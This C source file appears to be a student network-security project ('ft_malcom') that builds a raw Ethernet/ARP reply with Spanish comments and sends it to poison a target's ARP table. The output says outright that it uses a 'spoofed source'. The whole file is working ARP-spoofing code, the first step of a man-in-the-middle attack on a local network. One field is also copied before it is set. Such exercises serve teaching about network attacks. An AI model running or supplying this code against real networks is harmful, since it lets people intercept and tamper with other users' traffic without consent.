#include "ft_malcom.h"

void mac_str_to_bin(const char *mac_str, uint8_t *mac_bin)
{
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &mac_bin[0], &mac_bin[1], &mac_bin[2], 
           &mac_bin[3], &mac_bin[4], &mac_bin[5]);
}

void ft_ether_aton(const char *mac_str, uint8_t *mac_bin) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_bin[0], &mac_bin[1], &mac_bin[2],
           &mac_bin[3], &mac_bin[4], &mac_bin[5]);
}


int send_arp(t_malcom *data)
{
    int sockfd;
    int if_index;
    struct arp_packet packet;
    struct sockaddr_ll sock_addr;

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //sockraw porque no podemos mandar packet arp con un socket normal. sockraw son paquetes crudos 
    if (sockfd < 0)
    {
        if (!data->s)
            fprintf(stderr, "Failed to create RAW socket\n");
        exit(1);
    }
    if_index = if_nametoindex(data->iface);
    if (if_index == 0)
    {
        if (!data->s)
            fprintf(stderr, "Failed to obtain index of the network interface: %s\n", data->iface);
        exit(1);
    }

    uint8_t target_mac[6];
    uint8_t source_mac[6];

    mac_str_to_bin(data->t_mac, target_mac);
    ft_ether_aton(data->s_mac, source_mac);

    //configuracion sockaddr struct
    ft_memset(&sock_addr, 0, sizeof(struct sockaddr_ll));
    sock_addr.sll_family = AF_PACKET;//ethernet packet
    sock_addr.sll_protocol = htons(ETH_P_ARP);//protocolo arp
    sock_addr.sll_ifindex = if_index;
    sock_addr.sll_halen = ETH_ALEN;
    ft_memcpy(sock_addr.sll_addr, packet.arp.arp_tha, ETH_ALEN);


    //empezamos a configurar nuestro paquete arp de 42 bytes

    //header ethernet 14 bytes
    ft_memcpy(packet.eth.h_dest, target_mac, ETH_ALEN); //MAC destino
    ft_memcpy(packet.eth.h_source, source_mac, ETH_ALEN); //MAC origen
    packet.eth.h_proto = htons(ETH_P_ARP); //protocolo ARP

    //header arp 8 bytes
    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);//indicar el tipo de hw que usa la red (ethernet)
    packet.arp.ea_hdr.ar_pro = htons(ETH_P_IP);//indicar protocolo de red que usara. protocolo ipv4
    packet.arp.ea_hdr.ar_hln = ETH_ALEN; //len de la mac ETH_ALEN = 6bytes
    packet.arp.ea_hdr.ar_pln = 4;//len de la IP = 4bytes
    packet.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);//definir si es solicitud o respuesta. Reply en este caso

    // direcciones MAC e IP de src y dst. 20 bytes
    ft_memcpy(packet.arp.arp_sha, source_mac, ETH_ALEN);//source MAC
    inet_pton(AF_INET, data->s_ip, (void *)&packet.arp.arp_spa);//source ip
    ft_memcpy(packet.arp.arp_tha, target_mac, ETH_ALEN);//target MAC
    inet_pton(AF_INET, data->t_ip, (void *)&packet.arp.arp_tpa);// target IP

    if (!data->s)
        printf("Now sending an ARP reply to %s with spoofed source %s, please wait...\n", data->t_ip, data->s_ip);

    if (data->v == 1)
    {
        printf("Hex dump pf ARP packet:\n");
        print_hex(&packet, sizeof(packet), stdout);
    }
    else if (data->o == 1)
    {
        FILE *output_file = fopen(data->output, "w");
        if (output_file == NULL)
        {
            if (!data->s)
                fprintf(stderr, "Failed to open output file\n");
            exit(1);
        }

        fprintf(output_file, "Hex dump pf ARP packet:\n");
        print_hex(&packet, sizeof(packet), output_file);
    }
    
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr*)&sock_addr, sizeof(sock_addr)) < 0)
    {
        if (!data->s)
            fprintf(stderr, "Failed to send ARP reply\n");
        close(sockfd);
        exit(1);
    }
    if (!data->s)
        printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
    return (0);
}